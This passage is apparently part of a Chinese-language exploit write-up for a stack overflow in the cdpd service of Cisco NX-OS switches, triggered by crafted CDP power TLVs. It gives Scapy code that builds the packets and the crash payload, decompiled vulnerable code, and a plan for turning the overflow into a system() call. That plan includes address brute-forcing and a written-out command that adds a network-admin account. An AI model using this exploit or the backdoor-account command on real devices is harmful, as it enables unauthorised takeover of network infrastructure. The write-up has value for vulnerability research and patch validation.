    # link layer
    l2_packet = Ether(dst="01:00:0c:cc:cc:cc")
    # Logical-Link Control
    l2_packet /= LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) / SNAP()
    # Cisco Discovery Protocol
    cdp_v2 = cdp.CDPv2_HDR(vers=2, ttl=180)
    deviceid = cdp.CDPMsgDeviceID(val=cmd)
    portid = cdp.CDPMsgPortID(iface=b"ens38")
    address = cdp.CDPMsgAddr(naddr=1, addr=cdp.CDPAddrRecordIPv4(addr="192.168.1.3"))
    cap = cdp.CDPMsgCapabilities(cap=1)
    cdp_packet = cdp_v2/deviceid/portid/address/cap
    packet = l2_packet / cdp_packet
    sendp(packet)
## 触发漏洞
下一步，就是研究怎么触发漏洞。首先，把cdpd从设备中给取出来，然后把二进制丢到ida里找漏洞点。根据Armis
Labs发布的漏洞分析，找到了该漏洞存在于`cdpd_poe_handle_pwr_tlvs`函数，相关的漏洞代码如下：
    if ( (signed int)v28 > 0 )
          {
            v35 = (int *)(a3 + 4);
            v9 = 1;
            do
            {
              v37 = v9 - 1;
              v41[v9 - 1] = *v35;
              *(&v40 + v9) = _byteswap_ulong(*(&v40 + v9));
              if ( !sdwrap_hist_event_subtype_check(7536640, 104) )
              {
                *(_DWORD *)v38 = 104;
                snprintf(&s, 0x200u, "pwr_levels_requested[%d] = %d\n", v37, *(&v40 + v9));
                sdwrap_hist_event(7536640, strlen(&s) + 5, v38);
              }
              if ( sdwrap_chk_int_all(104, 0, 0, 0, 0) )
              {
                v24 = *(&v40 + v9);
                buginf_ftrace(1, &sdwrap_dbg_modname, 0, "pwr_levels_requested[%d] = %d\n");
              }
              snprintf(v38, 0x3FCu, "1111 pwr_levels_requested[%d] = %d\n", v37, *(&v40 + v9), v24);
              sdwrap_his_log_event_for_uuid_inst(124, 7536640, 1, 0, strlen(v38) + 1, v38);
              *(_DWORD *)(a1 + 4 * v9 + 1240) = *(&v40 + v9);
              ++v35;
              ++v9;
            }
            while ( v9 != v28 + 1 );
          }
后续仍然是根据Armis Labs漏洞分析文章中的内容，只要在cdp包中增加Power Request和Power
Level就能触发cdpd程序crash：
    power_req = cdp.CDPMsgUnknown19(val="aaaa"+"bbbb"*21)
    power_level = cdp.CDPMsgPower(power=16)
    cdp_packet = cdp_v2/deviceid/portid/address/cap/power_req/power_level
## 漏洞利用
首先看看二进制程序的保护情况：
    $ checksec cdpd_9.2.3
        Arch:     i386-32-little
        RELRO:    No RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      PIE enabled
        RPATH:    '/isan/lib/convert:/isan/lib:/isanboot/lib'
发现只开启了NX和PIE保护，32位程序。
因为该程序没法进行交互，只能一次性发送完所有payload进行利用，所以没办法泄漏地址。因为是32位程序，cdpd程序每次crash后会自动重启，所以我们能爆破地址。
在编写利用脚本之前需要注意几点：
1.栈溢出在覆盖了返回地址后，后续还会继续覆盖传入函数参数的地址。
     *(_DWORD *)(a1 + 4 * v9 + 1240) = *(&v40 + v9);
并且因为在漏洞代码附近有这样的代码，需要向a1地址附近的地址写入值。如果只覆盖返回地址，没法只通过跳转到一个地址达到命令执行的目的。所以我们的payload需要把a1覆盖成一个可写的地址。
2.在`cdpd_poe_handle_pwr_tlvs`函数中，有很多分支都会进入到`cdpd_send_pwr_req_to_poed`函数，而在该函数中有一个`__memcpy_to_buf`函数，这个函数限制了`Power
Requested`的长度在40字节以内。这么短的长度，并不够进行溢出利用。所以我们不能进入到会调用该函数的分支。
          v10 = *(_WORD *)(a1 + 1208);
          v11 = *(_WORD *)(a1 + 1204);
          v12 = *(_DWORD *)(a1 + 1212);
          if ( v32 != v10 || v31 != v11 )
我们需要让该条件判断为False，不进入该分支。因此需要构造好覆盖的a1地址的值。
3.我们利用的最终目的不是执行`execve("/bin/bash")`，因为没法进行交互，所以就算执行了这命令也没啥用。那么我们能有什么利用方法呢？第一种，我们可以执行反连shell的代码。第二种，我们可以添加一个管理员账号，比如执行如下命令：
    /isan/bin/vsh -c "configure terminal ; username test password qweASD123 role network-admin"
我们可以通过执行`system(cmd)`达到目的。那么接下来的问题是怎么传参呢？经过研究发现，在CDP协议中的`DeviceID`相关的字段内容都储存在堆上，并且该堆地址就储存在栈上，我们可以通过`ret`来调整栈地址。这样就能成功向`system`函数传递任意参数了。
最后放一个演示视频：
**参考链接**
  1. 
  2. 
  3. 
  4. 
* * *